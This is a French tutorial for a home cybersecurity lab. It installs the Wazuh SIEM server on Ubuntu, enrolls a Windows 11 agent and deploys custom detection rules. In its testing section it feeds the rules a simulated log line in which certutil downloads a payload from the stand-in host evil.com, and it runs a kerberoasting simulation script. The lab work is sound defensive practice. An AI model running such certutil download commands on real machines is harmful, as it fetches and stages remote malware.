# 🛡️ Guide d'installation Wazuh — Cyber Homelab

> **Objectif** : Installer Wazuh sur une VM Ubuntu Server et connecter un agent Windows 11.  
> **Temps estimé** : 45–60 minutes  
> **Prérequis** : VirtualBox ou VMware, ISO Ubuntu Server 22.04 LTS

---

## Table des matières

1. [Architecture du lab](#architecture)
2. [Prérequis matériels](#prérequis)
3. [Installation Wazuh Server (Ubuntu VM)](#installation-serveur)
4. [Accès au Dashboard Wazuh](#dashboard)
5. [Installation agent Windows 11](#agent-windows)
6. [Déploiement des règles custom](#règles-custom)
7. [Vérification et test](#vérification)
8. [Dépannage](#dépannage)

---

## 1. Architecture du lab {#architecture}

```
┌─────────────────────────────────────────┐
│           Réseau NAT (VirtualBox)       │
│           192.168.56.0/24              │
│                                         │
│  ┌────────────────┐  ┌───────────────┐ │
│  │ Ubuntu Server  │  │  Windows 11   │ │
│  │ Wazuh Manager  │←─│  Wazuh Agent  │ │
│  │ 192.168.56.10  │  │ 192.168.56.20 │ │
│  │ Port 55000 API │  │               │ │
│  │ Port 443 Dash. │  │ Sysmon activé │ │
│  └────────────────┘  └───────────────┘ │
└─────────────────────────────────────────┘
```

---

## 2. Prérequis matériels {#prérequis}

| Composant | Minimum | Recommandé |
|-----------|---------|------------|
| RAM (Wazuh VM) | 4 Go | 8 Go |
| CPU (Wazuh VM) | 2 cœurs | 4 cœurs |
| Disque (Wazuh VM) | 50 Go | 100 Go |
| RAM (Windows VM) | 4 Go | 8 Go |
| OS Wazuh | Ubuntu Server 22.04 | Ubuntu Server 22.04 |

**Logiciels nécessaires :**
- [VirtualBox](https://www.virtualbox.org/wiki/Downloads) (gratuit)
- [Ubuntu Server 22.04 LTS ISO](https://ubuntu.com/download/server)
- [Windows 11 (ISO ou VM existante)](https://www.microsoft.com/fr-fr/software-download/windows11)

---

## 3. Installation Wazuh Server (Ubuntu VM) {#installation-serveur}

### 3.1 Créer la VM Ubuntu dans VirtualBox

1. Ouvrir VirtualBox → **Nouvelle**
2. Nom : `Wazuh-Server`, Type : Linux, Version : Ubuntu 22.04
3. RAM : 4096 Mo, Disque : 50 Go (VDI, dynamique)
4. **Réseau** : 2 cartes réseau
   - Carte 1 : NAT (accès internet pour télécharger Wazuh)
   - Carte 2 : Réseau hôte uniquement → `192.168.56.10`

### 3.2 Installer Ubuntu Server

Pendant l'installation :
- Langue : English (recommandé pour les logs)
- Pas d'interface graphique (server minimal)
- Activer OpenSSH server ✅
- Nom d'hôte : `wazuh-server`

### 3.3 Configurer l'IP fixe

```bash
# Éditer la config réseau (Netplan)
sudo nano /etc/netplan/00-installer-config.yaml
```

```yaml
network:
  version: 2
  ethernets:
    enp0s3:        # Carte NAT (internet)
      dhcp4: true
    enp0s8:        # Carte réseau hôte
      dhcp4: false
      addresses: [192.168.56.10/24]
```

```bash
sudo netplan apply
```

### 3.4 Installer Wazuh (méthode officielle "Quick Start")

```bash
# Mettre à jour le système
sudo apt update && sudo apt upgrade -y

# Télécharger le script d'installation Wazuh
curl -sO https://packages.wazuh.com/4.7/wazuh-install.sh
curl -sO https://packages.wazuh.com/4.7/config.yml

# Éditer la config (IPs du lab)
nano config.yml
```

Contenu de `config.yml` à adapter :

```yaml
nodes:
  indexer:
    - name: node-1
      ip: "192.168.56.10"

  server:
    - name: wazuh-1
      ip: "192.168.56.10"

  dashboard:
    - name: dashboard
      ip: "192.168.56.10"
```

```bash
# Lancer l'installation (prend 10-15 min)
sudo bash wazuh-install.sh -a

# En cas d'erreur mémoire : ajouter swap
sudo fallocate -l 4G /swapfile
sudo chmod 600 /swapfile
sudo mkswap /swapfile
sudo swapon /swapfile
```

**⚠️ Sauvegarder les mots de passe affichés à la fin !**

```
# Exemple de sortie :
User: admin
Password: XXXXXXXXXX
```

### 3.5 Vérifier les services

```bash
sudo systemctl status wazuh-manager
sudo systemctl status wazuh-indexer
sudo systemctl status wazuh-dashboard

# Tous doivent être "active (running)"
```

---

## 4. Accès au Dashboard Wazuh {#dashboard}

1. Ouvrir un navigateur sur votre Windows 11 **hôte**
2. Aller sur : `https://192.168.56.10`
3. Accepter le certificat auto-signé (Avancé → Continuer)
4. Login : `admin` / mot de passe sauvegardé
5. 🎉 Dashboard Wazuh accessible !

---

## 5. Installation agent Windows 11 {#agent-windows}

### 5.1 Télécharger l'agent

Depuis Windows 11, aller sur : `https://packages.wazuh.com/4.x/windows/wazuh-agent-4.7.0-1.msi`

### 5.2 Installer via PowerShell (Admin)

```powershell
# Lancer PowerShell en tant qu'Administrateur

# Installer l'agent Wazuh
Invoke-WebRequest -Uri "https://packages.wazuh.com/4.x/windows/wazuh-agent-4.7.0-1.msi" -OutFile "$env:TEMP\wazuh-agent.msi"

# Démarrer l'installation silencieuse
msiexec.exe /i "$env:TEMP\wazuh-agent.msi" /qn WAZUH_MANAGER="192.168.56.10" WAZUH_AGENT_NAME="WS-WIN11-LAB"

# Démarrer le service agent
NET START WazuhSvc
```

### 5.3 Vérifier la connexion

Sur le Wazuh Manager (Ubuntu VM) :
```bash
sudo /var/ossec/bin/agent_control -l
# Doit afficher l'agent Windows avec statut "Active"
```

---

## 6. Déploiement des règles custom {#règles-custom}

```bash
# Copier les règles du projet sur le serveur Wazuh
scp 01-soc/rules/*.xml user@192.168.56.10:/tmp/

# Sur le serveur Wazuh
sudo cp /tmp/wazuh_*.xml /var/ossec/etc/rules/
sudo chown wazuh:wazuh /var/ossec/etc/rules/wazuh_*.xml

# Vérifier la syntaxe des règles
sudo /var/ossec/bin/ossec-logtest

# Redémarrer Wazuh pour appliquer
sudo systemctl restart wazuh-manager
```

---

## 7. Vérification et test {#vérification}

```bash
# Tester les règles avec un log simulé
echo "Dec 25 10:00:00 WS-WIN11 certutil.exe -urlcache -f http://evil.com/payload.exe" | \
  sudo /var/ossec/bin/ossec-logtest

# Surveiller les alertes en temps réel
sudo tail -f /var/ossec/logs/alerts/alerts.json | python3 -m json.tool
```

Depuis Windows 11, lancer le simulateur du projet :
```bash
python 01-soc/scripts/simulate_attack.py --scenario kerberoasting --verbose
```

---

## 8. Dépannage {#dépannage}

| Problème | Solution |
|----------|----------|
| Dashboard inaccessible | `sudo systemctl restart wazuh-dashboard` |
| Agent non connecté | Vérifier le firewall : `sudo ufw allow 1514/tcp` |
| Installation échoue (mémoire) | Ajouter swap (voir §3.4) |
| Règles non appliquées | Vérifier syntaxe XML + redémarrer wazuh-manager |
| API Wazuh refus | Token expiré — relancer l'authentification |

---

## Ressources

- 📖 [Documentation officielle Wazuh](https://documentation.wazuh.com)
- 🎓 [Wazuh Lab GitHub](https://github.com/wazuh/wazuh)
- 🗺️ [MITRE ATT&CK pour Wazuh](https://documentation.wazuh.com/current/proof-of-concept-guide/poc-detect-mitre-attack.html)
